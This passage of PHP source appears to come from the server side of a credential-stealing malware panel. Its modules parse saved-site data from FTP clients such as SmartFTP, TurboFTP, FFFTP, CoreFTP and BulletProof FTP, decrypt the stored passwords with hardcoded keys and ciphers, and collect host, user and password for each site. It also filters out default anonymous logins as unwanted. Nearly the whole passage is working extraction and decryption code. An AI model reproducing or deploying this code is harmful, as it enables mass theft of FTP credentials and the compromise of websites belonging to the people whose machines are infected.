				if (($id & 0x10) > 0)
				{
					$proto = $stream->read_dword();
					if ($proto == 0x1002)
						$proto = 3;
				}
				else
				{
					$proto = 0;
				}

				$this->add_ftp(append_port_dir(ftp_force_ssh($host, $proto == 3), $port, $dir), $user, $pass);
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTP Commander

class module_ftpcommander_base extends module
{
	protected function decrypt($pass)
	{
		if (!strlen($pass))
			return false;

		for ($i = 0; $i < strlen($pass); $i++)
			$pass[$i] = chr(ord($pass[$i]) ^ 0x19);

		return $pass;
	}

	protected function process_ini($value)
	{
		if (!strlen($value))
			return;

		$values = parse_lines($value);
		foreach ($values as $line)
		{
			$parsed_line = explode(';', $line);

			$host = '';
			$user = '';
			$pass = '';
			$port = '';
			$dir = '';
			$use_ssh = '';

			foreach ($parsed_line as $v)
			{
				$name = substr($v, 0, strpos($v, '='));
				$val = substr($v, strpos($v, '=')+1);

				if (strtolower($name) == 'server')
					$host = trim($val);

				if (strtolower($name) == 'port')
					$port = trim($val);

				if (strtolower($name) == 'user')
					$user = trim($val);

				if (strtolower($name) == 'password')
				{
					$pass = trim($val);

					if ($pass == '1' || $pass == '0')
						$pass = '';
					else
					{
						$pass = $this->decrypt($pass);
					}
				}

				if (strtolower($name) == 'initialdir')
					$dir = trim($val);

				if (strtolower($name) == 'usessh')
					$use_ssh = trim($val);
			}

			$this->add_ftp(append_port_dir(ftp_force_ssh($host, $use_ssh == '1'), $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		if ($id != 0x0000)
		{
			$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
			return false;
		}
		$this->process_ini($stream->read_str());
		return true;
	}
}

class module_ftpcommander extends module_ftpcommander_base
{
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// BulletProof FTP

class stream_bulletproof extends stream
{
	public function read_bps_string()
	{
		$result = $this->read_strlen($this->read_byte());
		if (!$this->state)
			return false;
		$seed = strlen($result);
		for ($i = 0; $i < strlen($result); $i++)
			$result[$i] = chr(ord($result[$i]) ^ myrand(0x100, $seed));
		return $result;

	}
}

class module_bulletproof extends module
{
	protected function decrypt($pass)
	{
		if (!strlen($pass) || strlen($pass)%2 != 0)
			return false;

		if (substr($pass, 0, 2) != 'bp')
			return false;

		$pass = substr($pass, 2);
		$l = int_divide(strlen($pass), 2);
		$seed = $l + 0x3F8A7A;
		$result = '';
		for ($i = 0; $i < $l; $i++)
		{
			$c = ord($pass[$i*2]) - 0x61;
    		$c = ($c << 4) - $c;
    		$d = ord($pass[$i*2+1]) - 0x61;
    		$result .= chr((($d + $c) & 0xff) ^ (myrand(0xfa, $seed)));
		}

		return $result;
	}

	protected function process_bps($value)
	{
		$stream = new stream_bulletproof($value, $this->log);

		if ($stream->read_bps_string($stream) != 'BPSitelist')
			return;

		$stream->read_skip(4);

		while ($stream->state && ($stream->pos < $stream->datalen))
		{
	        $stream->read_bps_string(); // itemname
	        $host = $stream->read_bps_string(); // host
	        $user = $stream->read_bps_string(); // user
	        $dir = $stream->read_bps_string(); // remote_dir
	        $stream->read_bps_string(); // local_dir
	        $port = $stream->read_bps_string(); // port (string)
	        $pass = $stream->read_bps_string(); // pass
			$stream->read_skip(25);
			if ($stream->state)
				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	protected function process_dat($value)
	{
		$values = parse_lines($value);
		if (count($values) >= 7)
		{
			$host = $values[1];
			$port = $values[2];
			$user = $values[3];
			$pass = $this->decrypt($values[4]);
			$dir = $values[6];
			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);
		}
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_bps($stream->read_str());
				break;
			case 0x0001:
				$this->process_dat($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// SmartFTP 2.x-4.x

class stream_smartftp extends stream
{
	public function read_smartstr()
	{
		if (!$this->state)
			return false;
		$w = $this->read_word();
		$b = $this->read_byte();
		if ($w != 0xfeff || $b != 0xff)
		{
			$this->push_error('ERR_SMARTFTP_STR');
			return false;
		}
		$len = $this->read_byte();
		if ($len == 0xff)
			$len = $this->read_word();
		if (!$this->state)
			return false;
		return unicode_to_ansi($this->read_strlen($len*2));
	}

	public function read_smartwstr()
	{
		if (!$this->state)
			return false;
		return $this->read_strlen($this->read_word());
	}
}

class module_smartftp extends module
{
	protected function decrypt($pass)
	{
		if ((!strlen($pass)) || ((strlen($pass) % 4) != 0))
			return false;

		$crypt = array(
		    0xE722, 0xF62F, 0xB67C, 0xDD5A, 0x0FDB, 0xB94E, 0x5196, 0xE040, 0xF694, 0xABE2, 0x21BB, 0xFC08, 0xE48E, 0xB96A, 0x55D7, 0xA6E5,
    		0xA4A1, 0x2172, 0x822D, 0x29EC, 0x57E4, 0x1458, 0x04D1, 0x9DC1, 0x7020, 0xFC6A, 0xED8F, 0xEFBA, 0x8E88, 0xD689, 0xD18E, 0x8740,
    		0xA6DE, 0x8E01, 0x3AC2, 0x6871, 0xEE11, 0x8C2A, 0x5FC1, 0x337F, 0x6D32, 0xD471, 0x7DC9, 0x0CD9, 0x5071, 0xA094, 0x1605, 0x6FD7,
    		0x3638, 0x4FFD, 0xB3B2, 0x9717, 0xBECA, 0x721C, 0x623F, 0x068F, 0x698F, 0x7FFF, 0xE29C, 0x27E8, 0x7189, 0x4939, 0xDB4E, 0xC3FD,
    		0x8F8B, 0xF4EE, 0x9395, 0x6B1A, 0xD1B1, 0x0F6A, 0x4D8B, 0xA696, 0xA79D, 0xBB9E, 0x00DF, 0x093C, 0x856F, 0xB51C, 0xF1C5, 0xE83D,
    		0x393A, 0x03D1, 0x68D8, 0x9659, 0xF791, 0xB2C2, 0x0234, 0x9B5C, 0xB1BF, 0x72EB, 0xDABA, 0xF1C5, 0xDA01, 0xF047, 0x3DD8, 0x72AB,
    		0xD6DD, 0x6793, 0x898D, 0x7757);

		$pass = hextostr($pass);

		if ($pass !== false)
		{
			$pass = substr($pass, 0, 200); // limit decryption length
			for ($i = 0; $i < int_divide(strlen($pass), 2); $i++)
			{
				$pass[$i*2] = chr(ord($pass[$i*2]) ^ ($crypt[$i] >> 8));
				$pass[$i*2+1] = chr(ord($pass[$i*2+1]) ^ ($crypt[$i] & 0xff));
			}
			return unicode_to_utf8($pass);
		} else
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return false;
		}
	}

	private function read_xml_item($xml_array)
	{
		$host = assign($xml_array['Host']);
		$user = assign($xml_array['User']);
		$pass = assign($xml_array['Password']);
		$pass = $this->decrypt($pass);
		$port = assign($xml_array['Port']);
		$dir = assign($xml_array['Path']);

		$host = Utf8ToWin($host);
		$user = Utf8ToWin($user);
		$pass = Utf8ToWin($pass);
		$dir = Utf8ToWin($dir);

		$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	private function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if ((strval($key) == 'FavoriteItem') && is_array($value))
					$this->read_xml_item($value);
				$this->rec_scan_xml_array($value);
			}
		}
	}

	protected function process_xml($value)
	{
		if (!strlen($value))
			return;

		// some XMLs are actually binary files
		if (substr($value, 0, 4) ==  "\x53\x43\x55\x01")
			return;

		$xml_parser = new XMLParser($value);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	private function process_fav_item($stream)
	{
		$type_id = $stream->read_word();
		if ($type_id == 0xffff)
		{
			$stream->read_skip(2);
			$ctype = $stream->read_smartwstr();
			if (!$stream->state || ($ctype != 'CStorageFolder' && $ctype != 'CFavoritesItem'))
			{
				$this->log->add('ERR_INVALID_SMARTFTP_TYPE');
				return false;
			}
		}

		$stream->read_skip(16);
		$stream->read_smartstr(); // ItemName
		$nSubItems = $stream->read_word();

		if ($stream->eof())
			return true;

		if ($nSubItems > 0)
		{
			// folder
			while ($nSubItems-- && $stream->state)
			{
				if (!$this->process_fav_item($stream))
					return false;
			}
			return $stream->state;
		}

		if (!$stream->state)
			return false;

		$ver = $stream->read_dword();

		$host = $stream->read_smartstr();
		$user = $stream->read_smartstr();
		$pass = $stream->read_smartstr();

		if ($ver > 3)
			$stream->read_smartstr(); // account

		if (($ver == 1) || ($ver == 2) || ($ver == 3) || ($ver == 4) || ($ver == 5) || ($ver == 6) || ($ver == 7))
		{
			$stream->read_skip(4);
			if ($ver >= 6)
				$stream->read_skip(4);
			$port = $stream->read_dword();
			$stream->read_skip(4);
			$dir = $stream->read_smartstr();
			$stream->read_smartstr(); // Decription
			$stream->read_skip(16);
			$bookmark_count = $stream->read_word();
			for ($i = 0; $i < $bookmark_count; $i++)
			{
				$type_id = $stream->read_word();
				if ($type_id == 0xffff)
				{
					$stream->read_skip(2);
					$ctype = $stream->read_smartwstr();
					if (!$stream->state || ($ctype != 'CBookmarkItem'))
					{
						$this->log->add('ERR_INVALID_SMARTFTP_TYPE');
						return false;
					}
				}
				$stream->read_smartstr(); // Bookmark1
				$stream->read_smartstr(); // Bookmark2
			}
			$stream->read_skip(4*16-4-8);
			if ($ver > 2)
				$stream->read_skip(8);
			$stream->read_smartstr(); // LocalFolder
			$stream->read_skip(4);
			$sub_ver = $stream->read_dword();

			if ($sub_ver == 1)
			{
				$stream->read_smartstr(); // MapURL1
				$stream->read_smartstr(); // MapURl2
				$stream->read_skip(4*16-4);
			} else
			{
				$stream->read_skip(4*16-8);
			}
			if ($ver > 2)
				$stream->read_skip(4);
			$stream->read_smartstr(); // CertStr
			if ($ver > 2)
				$stream->read_skip(4);
			$stream->read_skip(8);
			$stream->read_smartstr(); // ProxyHost
			$stream->read_skip(4); // ProxyPort
			$stream->read_skip(4); // ProxyType
			$stream->read_smartstr(); // ProxyUser
			$stream->read_smartstr(); // ProxyPass

			$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

			$stream->read_skip(80);
			// Seek for 0x0180 | 0x0380
			while ($stream->state && !$stream->eof())
			{
				$first_ver_byte = $stream->read_byte();
				if (($first_ver_byte == 0x03 || $first_ver_byte == 0x01) && ($stream->read_byte() == 0x80))
				{
					$stream->pos -= 2;
					break;
				}
			}
		} else
		{
			$this->log->add('ERR_INVALID_SMARTFTP_VERSION: '.$ver);
			return false;
		}
		return $stream->state;
	}

	protected function process_favorites($value)
	{
		if (strlen($value) < 12)
			return false;

		$header = substr($value, 0, 4);
		if ($header != "\x53\x43\x55\x01")
			return false;

		// unpack confing data
		$unpacked_data_len = data_int32(substr($value, 4, 4));
		$packed_data = substr($value, 12);
		$unpacked_data = gzuncompress($packed_data);
		if ($unpacked_data !== false && strlen($unpacked_data) == $unpacked_data_len)
		{
			if (strlen($unpacked_data) > 16)
			{
				$stream = new stream_smartftp($unpacked_data, $this->log);
				$stream->read_skip(20);
				$stream->read_smartstr();
				$count = $stream->read_word();
				while ($stream->state && $count--)
				{
					if (!$this->process_fav_item($stream))
						return false;
				}
			}
			return true;
		} else
		{
			$this->log->add('ERR_CANNOT_UNPACK_SMARTFTP_CONFIG');
            return false;
        }
	}

	protected function process_history($value)
	{
		if (!strlen($value))
			return false;

		$header = substr($value, 0, 4);
		if ($header != "\x53\x43\x55\x01")
			return false;

		// unpack confing data
		$unpacked_data_len = data_int32(substr($value, 4, 4));
		$packed_data = substr($value, 12);
		$unpacked_data = gzuncompress($packed_data);

		$ver = 0;

		if ($unpacked_data !== false && strlen($unpacked_data) == $unpacked_data_len)
		{
			if (strlen($unpacked_data) > 16)
			{
				$stream = new stream_smartftp($unpacked_data, $this->log);
				$stream->read_skip(4);
				$count = $stream->read_word();

				while ($stream->state && $count--)
				{
					$type_id = $stream->read_word();
					if ($type_id == 0xffff)
					{
						$ver = $stream->read_word();
						$ctype = $stream->read_smartwstr();
						if (!$stream->state || ($ctype != 'CHistoryItem'))
						{
							$this->log->add('ERR_INVALID_SMARTFTP_TYPE');
							return false;
						}
					}

					$stream->read_skip(32);
					if ($stream->eof())
						return true;

					if ($ver >= 5)
						$stream->read_skip(4);

					if ($stream->eof())
						return true;

					if ($ver < 6)
					{
						$host = $stream->read_smartstr();
						$user = $stream->read_smartstr();
						$pass = $stream->read_smartstr();
						$dir = $stream->read_smartstr();
						$port = $stream->read_dword();
						$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

						$stream->read_skip(24-8);
						if ($ver >= 5)
							$stream->read_skip(8);
						$stream->read_smartstr(); // UnkStr1
						$stream->read_smartstr(); // UnkStr2
						$stream->read_skip(4);
					}
				}
			}
		} else
		{
			$this->log->add('ERR_CANNOT_UNPACK_SMARTFTP_QUICK_CONFIG');
		}
		return true;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_xml($stream->read_str());
				break;
			case 0x0001:
				$this->process_favorites($stream->read_str());
				break;
			case 0x0002:
				$this->process_history($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// TurboFTP

class stream_turboftp extends stream
{
	protected function decrypt($pass)
	{
		if (!strlen($pass) || !$this->state)
			return false;

		for ($i = 0; $i < strlen($pass); $i++)
			$pass[$i] = chr(ord($pass[$i]) ^ 0x49);

		return $pass;
	}

	public function read_turbostr_unicode()
	{
		if (!$this->state)
			return false;
		$l = $this->read_byte();
		if ($l == 0xff)
			$l = $this->read_word();
		if ($l == 0xffff)
			$l = $this->read_dword();
		return $this->read_strlen($l*2);
	}

	public function read_turbostr($is_pass = false)
	{
		if (!$this->state)
			return false;
		$l = $this->read_byte();
		if ($l == 0xff)
			$l = $this->read_word();
		if ($l == 0xfffe)
		{
			$data = unicode_to_ansi($this->read_turbostr_unicode());
			if ($is_pass)
			{
				return $this->decrypt($data);
			}
			else
				return $data;
		}
		if ($l == 0xffff)
			$l = $this->read_dword();
		if ($is_pass)
			return $this->decrypt($this->read_strlen($l));
		else
			return $this->read_strlen($l);

	}
}

class module_turboftp extends module
{
	private function read_item($stream, $ver, $is_quick = false)
	{
		$ver_c = '0';
		if (strlen($ver) > 0)
			$ver_c = $ver[0];

		$protocol = 0;

        $ver_f = intval(substr($ver, 2, 4));

        if (!$is_quick)
			$stream->read_dword(); // Unk
		$stream->read_turbostr(); // SiteName
		$stream->read_skip(4);
		$host = $stream->read_turbostr();
		$stream->read_turbostr(); // Decription
		$stream->read_skip(4);
		$user = $stream->read_turbostr();
		$pass = $stream->read_turbostr(true);
		$stream->read_skip(4);
		$stream->read_turbostr(); // Local folder
		$dir = $stream->read_turbostr(); // Remote folder
		$stream->read_skip(12);
		$port = strval($stream->read_word()); // Port
		$stream->read_skip(30);

		if ($ver_c == '2' && $ver_f <= 72)
        {
            // do not process
        } elseif ($ver_c == '2' && $ver_f <= 81)
        {
			$stream->read_skip(2);
        } else
        {
            // Remote booksmarks
            $bookmark_count = $stream->read_word();
            for ($k = 0; $k < $bookmark_count; $k++)
            {
                $stream->read_turbostr(); // RemoteBookmark Name
                $stream->read_turbostr(); // RemoteBookmark Value
            }

            $stream->read_turbostr(); // Account
            $stream->read_skip(64);
            $stream->read_turbostr(); // Commands
        }

		if ($ver_c >= '3')
		{
            $stream->read_skip(10);
            $protocol = $stream->read_word(); // Connection Protocol (0 - FTP, 4 - SFTP)
            $stream->read_skip(8);

			if ($ver_c == '3' && $ver_f <= 60)
			{
			} else
			{
            	$stream->read_turbostr(); // Exclude filter
				$stream->read_skip(4);

				$stream->read_turbostr(); // SSL cert
				$stream->read_turbostr(); // Private key
				$stream->read_turbostr(); // Private pass
				if ($ver_c >= '4')
					$stream->read_skip(2);
				$stream->read_skip(14);
				$stream->read_turbostr(); // Include filter
			}

            if ($ver_c >= '5')
            {
                $stream->read_turbostr();
                $stream->read_skip(5*16+8);
                $stream->read_turbostr();
                $stream->read_turbostr();
                $stream->read_skip(4);
                $stream->read_turbostr();
                $stream->read_turbostr();
                $stream->read_skip(20);
                $stream->read_turbostr();
                $stream->read_turbostr();
                $stream->read_turbostr();
                $stream->read_turbostr();
                $stream->read_turbostr();
                if ($ver_c == '6')
                {
                    $bookmark_count = $stream->read_word();
                    for ($k = 0; $k < $bookmark_count; $k++)
                    {
                        // Local bookmarks
                        $stream->read_turbostr(); // LocalBookmark1
                        $stream->read_turbostr(); // LocalBookmark2
                    }
                }
            } else
                $stream->read_turbostr(); // Dial-up connection
		}

		if ($user != 'anonymous' || ($pass != 'TurboFTP@' && $pass != 'TurboFTP@usa.net' && $pass != 'turboftp@')) // filter unwanted default anonymous logins
        	$this->add_ftp(append_port_dir(ftp_force_ssh($host, $protocol == 4), $port, $dir), $user, $pass);
	}

	private function process_dat($value)
	{
		if (!strlen($value))
			return false;

		$stream = new stream_turboftp($value, $this->log);
		$ver = $stream->read_turbostr();
		$n_items = $stream->read_dword();
		$stream->read_skip(4);
		if (!$stream->state || ($n_items < 0))
		{
			$this->log->add('ERR_FAILED_TO_PROCESS_TURBOFTP_STREAM');
			return false;
		}
		for ($i = 0; $i < $n_items; $i++)
		{
            if ($stream->eof())
                break;
			$this->read_item($stream, $ver);
			if (!$stream->state)
			{
				$this->log->add('ERR_FAILED_TO_PROCESS_TURBOFTP_STREAM');
				return false;
			}
		}
		return $stream->state;
	}

	private function process_quick($value)
	{
		if (!strlen($value))
			return false;

		$stream = new stream_turboftp($value, $this->log);
		$ver = (float)$stream->read_dword() / 100;
		$ver = number_format($ver, 2, '.', '');
		if (!$stream->state)
		{
			$this->log->add('ERR_FAILED_TO_PROCESS_TURBOFTP_QUICK_STREAM');
			return false;
		}
		while ($stream->state)
		{
            if ($stream->eof())
                break;
			$this->read_item($stream, $ver, true);
			if (!$stream->state)
			{
				$this->log->add('ERR_FAILED_TO_PROCESS_TURBOFTP_QUICK_STREAM');
				return false;
			}
		}
		return $stream->state;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$this->process_dat($stream->read_str());
				break;
			case 0x0001:
				$this->process_quick($stream->read_str());
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FFFTP

class module_ffftp extends module
{
	protected function check_masterpass($cred_salt, $cred_check, $master_pass = 'DefaultPassword')
	{
		if (strlen($cred_salt) != 4 || strlen($cred_check) != 41)
			return '';

		$cred_check = substr($cred_check, 0, 40); // remove trailing NULL

		$hash = sha1($master_pass.chr(0).$cred_salt[3].$cred_salt[2].$cred_salt[1].$cred_salt[0]);

		$pos = 0;
		for ($i = 0; $i < 5; $i++)
		{
			$sum = 0;
			for ($k = 0; $k < 8; $k++)
			{
				$sum = $sum << 4;
				$sum = $sum + ord($cred_check[$pos++]) - 0x40;
			}

			$s = dechex($sum);
			while (strlen($s) < 8)
				$s = "0".$s;

			if ($s != substr($hash, $i*8, 8))
				return '';
		}

		return $master_pass;
	}

	protected function decrypt_old($pass, $master_pass = '')
	{
		if (strlen($pass) % 2 != 0 || !strlen($pass))
			return '';

		$i = 0; $k = 0;
		$l = strlen($pass);

		$result = '';
		while ($i < $l-1)
		{
			$eax = ((ord($pass[$i+1]) & 0xf) << 4) | ((ord($pass[$i]) & 0xf) << 8);
			$ecx = (ord($pass[$i]) >> 4) & 3;

			if (ord($pass[$i]) & 1)
				$i++;
			$i += 2;

    		$ecx = ($eax >> ($ecx+8)) | ($eax >> $ecx);

			if ($master_pass)
			{
				$ecx = $ecx ^ ord($master_pass[$k++ % strlen($master_pass)]);
			}

			$ecx = $ecx & 0xff;

			$result .= chr($ecx);
		}
		return $result;
	}

	protected function decrypt_new($pass, $master_pass = 'DefaultPassword')
	{
		$CCryptStr1 = chr(0x3e).chr(0x67).chr(0x5E).chr(0x72).chr(0x3D).chr(0x40).chr(0x4E).chr(0x37).chr(0x3D).chr(0x2F).chr(0x2F).chr(0x7A).chr(0x3C).chr(0x5B).chr(0x60).chr(0x3A);
		$CCryptStr2 = chr(0x56).chr(0x47).chr(0x37).chr(0x37).chr(0x64).chr(0x4F).chr(0x31).chr(0x23).chr(0x45).chr(0x79).chr(0x43).chr(0x5D).chr(0x24).chr(0x7C).chr(0x43).chr(0x40);

		$digest1 = hextostr(sha1($master_pass.$CCryptStr1));
		$digest2 = hextostr(sha1($master_pass.$CCryptStr2));

		$key = '';

		for ($i = 0; $i < 5; $i++)
		{
			$key .= $digest1[$i*4+3];
			$key .= $digest1[$i*4+2];
			$key .= $digest1[$i*4+1];
			$key .= $digest1[$i*4+0];
		}

		for ($i = 0; $i < 3; $i++)
		{
			$key .= $digest2[$i*4+3];
			$key .= $digest2[$i*4+2];
			$key .= $digest2[$i*4+1];
			$key .= $digest2[$i*4+0];
		}

		$data_iv = explode(':', $pass);

		if (count($data_iv) != 2)
			return '';

		$data = hextostr($data_iv[1]);
		$iv = hextostr($data_iv[0]);

		if (($data === false) || ($iv === false) || (strlen($data) % 16 != 0) || (strlen($iv) != 16))
		{
			$this->log->add('ERR_INVALID_HEX_STRING');
			return '';
		}

		$data = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $data, MCRYPT_MODE_CBC, $iv);

		if (!strlen($data))
		{
			$this->log->add("ERR_CANNOT_DECRYPT_PASSWORD");
		}

		return ztrim($data);
	}

	protected function decrypt_pass($pass, $cred_salt, $cred_check)
	{
		if (strlen($pass) == 0)
			return '';

		switch (substr($pass, 0, 2))
		{
			case "0A":
				return $this->decrypt_old(substr($pass, 2));
				break;
			case "0B":
				$master_pass = $this->check_masterpass($cred_salt, $cred_check);
				if ($master_pass)
					return $this->decrypt_old(substr($pass, 2), $master_pass);
				break;
			case "0C":
				$master_pass = $this->check_masterpass($cred_salt, $cred_check);
				if ($master_pass)
					return $this->decrypt_new(substr($pass, 2), $master_pass);
				break;
			default:
				return $this->decrypt_old($pass);
		}

		return '';
	}

	private $cred_check = '';
	private $cred_salt = '';

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0001:
				$this->cred_salt = $stream->read_str();
				break;
			case 0x0002:
				$this->cred_check = $stream->read_str();
				break;
			case 0x0000:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();
				$dir = $stream->read_str();
				$port = $stream->read_dword();

				// decrypt password
				$pass = $this->decrypt_pass($pass, $this->cred_salt, $this->cred_check);

				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// CoffeeCup FTP

class module_coffeecupftp extends module
{
	protected function decrypt_pass($pass)
	{
		if (strlen($pass) == 0)
			return '';

		$crypt_key = 'robert249fsd)af8.?sf2eaya;sd$%85034gsn%@#!afsgsjdg;iawe;otigkbarr';

		$salt = strlen($crypt_key)-1;

		for ($i = 0; $i < strlen($pass); $i++)
		{
			if (($salt & 8) == 0)
				$salt ^= 1;
			$salt = (~$salt) & 0xff;
			$salt = (($salt >> 1) | ($salt << 7)) & 0xff;
			$pass[$i] = chr(ord($crypt_key[strlen($crypt_key)-$i%strlen($crypt_key)-1]) ^ $salt ^ ord($pass[$i]));
		}

		return $pass;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();
				$port = $stream->read_str();
				$dir = $stream->read_str();

				// decrypt password
				$pass = $this->decrypt_pass($pass);

				$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// CoreFTP

class module_coreftp extends module
{
	protected function decrypt_pass($pass)
	{
		if (strlen($pass) == 0 || strlen($pass) % 32 != 0)
			return '';

		$iv = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
		$key = 'hdfzpysvpzimorhk';
	    $data = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, hextostr($pass), MCRYPT_MODE_ECB, $iv);

	    if (!strlen($data))
	    {
	    	$this->log->add("ERR_CANNOT_DECRYPT_PASSWORD");
	    }

	    return $data;
	}

	public function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0010:
				$host = $stream->read_str();
				$user = $stream->read_str();
				$pass = $stream->read_str();
				$port = $stream->read_dword();
				$dir = $stream->read_str();

				if (($id & 0x10) > 0)
					$ssh = $stream->read_dword();
				else
					$ssh = 0;

				// decrypt password
				$pass = $this->decrypt_pass($pass);

				$this->add_ftp(append_port_dir(ftp_force_ssh($host, $ssh == 1), $port, $dir), $user, $pass);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FTP Explorer

class stream_ftpexplorer extends stream
{
	public function read_explorerstr()
	{
		if (!$this->state)
			return false;
		$w = $this->read_word();
		$b = $this->read_byte();
		if ($w != 0xfeff || $b != 0xff)
		{
			$this->push_error('ERR_FTPEXPLORER_STR');
			return false;
		}
		$len = $this->read_byte();
		if ($len == 0xff)
			$len = $this->read_word();
		if (!$this->state)
			return false;
		return unicode_to_ansi($this->read_strlen($len*2));
	}

	public function read_explorerwstr()
	{
		if (!$this->state)
			return false;
		return $this->read_strlen($this->read_word());
	}
}

class module_ftpexplorer extends module
{
	private function read_xml_item($xml_array)
	{
		$host = assign($xml_array['Host']);
		$user = assign($xml_array['Login']);
		$pass = assign($xml_array['Password']);
		$port = assign($xml_array['Port']);
		$dir = assign($xml_array['RemotePath']);

		$host = Utf8ToWin($host);
		$user = Utf8ToWin($user);
		$pass = Utf8ToWin($pass);
		$dir = Utf8ToWin($dir);

		$this->add_ftp(append_port_dir($host, $port, $dir), $user, $pass);

		foreach ($xml_array as $value)
		{
			if (is_array($value))
				$this->read_xml_item($value);
		}
	}

	private function rec_scan_xml_array($xml_array)
	{
		foreach ($xml_array as $key=>$value)
		{
			if (is_array($value))
			{
				if (strpos(strval($key), 'ftpx') !== false)
					$this->read_xml_item($value);
				$this->rec_scan_xml_array($value);
			}
		}
	}

	private function process_xml($value)
	{
		if (!strlen($value))
			return;
		$xml_parser = new XMLParser($value);
		$parsed_xml = $xml_parser->parse();
		if (!$xml_parser->isError || is_array($parsed_xml))
		{
			$this->rec_scan_xml_array($parsed_xml);
		} else
		{
			$this->log->add("ERR_XML_PARSE");
		}
	}

	private function process_reg($value)
	{
		if (strlen($value) <= 10)
			return;

		$stream = new stream_ftpexplorer($value, $this->log);
		$stream->read_skip(8);
		$count = $stream->read_word();

		for ($i = 0; $i < $count; $i++)
		{
			if (!$stream->state)
				break;

			$item_type = $stream->read_word();

			if ($item_type == 0xffff)
			{
				$stream->read_skip(2);
				$str_type = $stream->read_explorerwstr();
				if ($str_type == 'CMFCToolBarButton')
					$item_type = 0x8001;
				else if ($str_type == 'CFTPToolBarComboBoxButton')
					$item_type = 0x6001; // guess
				else
					$item_type = 0;
			}

			if (!$stream->state)
				break;

			switch ($item_type)
			{
				case 0x8001:
					$stream->read_skip(12);
					$stream->read_explorerstr(); // Label
					$stream->read_skip(20);
					break;
				case 0x6001:
					$stream->read_skip(12);
					$stream->read_explorerstr(); // Label
					$stream->read_skip(32);
					$this->add_ftp($stream->read_explorerstr()); // Current host
					$stream->read_skip(8);
					$host_count = $stream->read_word();
					if ($host_count)
					{
						for ($j = 0; $j < $host_count; $j++)
						{
							$this->add_ftp($stream->read_explorerstr()); // Additional host
						}
						$stream->read_skip(4*$host_count);
					}
					break;
				default:
					$this->log->add('ERR_INVALID_FTPEXLORER_ITEMTYPE');
					return;
			}
		}
	}

	public function import_item($stream, $id)
	{
